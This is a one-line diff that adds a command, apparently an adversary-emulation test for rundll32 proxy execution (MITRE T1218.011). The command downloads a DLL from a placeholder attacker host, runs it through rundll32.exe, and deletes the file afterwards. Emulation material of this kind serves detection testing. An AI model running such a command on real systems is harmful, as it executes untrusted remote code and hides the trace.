@@ -1,0 +1,1 @@
+wget http://{ip_attacker}/T1218_011.dll -OutFile T1218_011.dll; rundll32.exe T1218_011.dll,krnl; del T1218_011.dll
